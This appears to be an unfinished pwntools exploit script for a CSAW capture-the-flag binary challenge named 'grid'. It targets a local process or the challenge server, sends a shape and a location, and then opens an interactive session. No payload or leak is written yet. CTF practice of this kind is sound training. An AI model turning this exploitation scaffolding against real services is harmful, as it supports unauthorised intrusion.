from pwn import *

BINARY = './grid'
HOST, PORT = "pwn.chal.csaw.io", 5013
context.endian = 'little'

elf = ELF(BINARY)
context.binary = elf

if not args.REMOTE:
    libc = elf.libc
else:
    libc = ELF("./libc-2.27.so")

def start_binary():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)
        
def debug(bps):
    gdbscript = ''

    for bp in bps:
        gdbscript += 'b *0x{:x}'.format(bp)

    gdb.attach(p, gdbscript=gdbscript)

p = start_binary()

def go():
    
    # if not args.REMOTE and args.GDB:
    #     debug([0x4005dc])
    enter_shape("s")
    loc_x(10)
    p.interactive()
    # loc_y(4)
    # enter_shape("d")
    # print p.recv()

def enter_shape(shape):
    p.sendafter("shape> ", shape)

def loc_x(x):
    p.sendafter("loc> ", str(x))
    # print p.recv()

def loc_y(y):
    p.sendline(str(y))
go()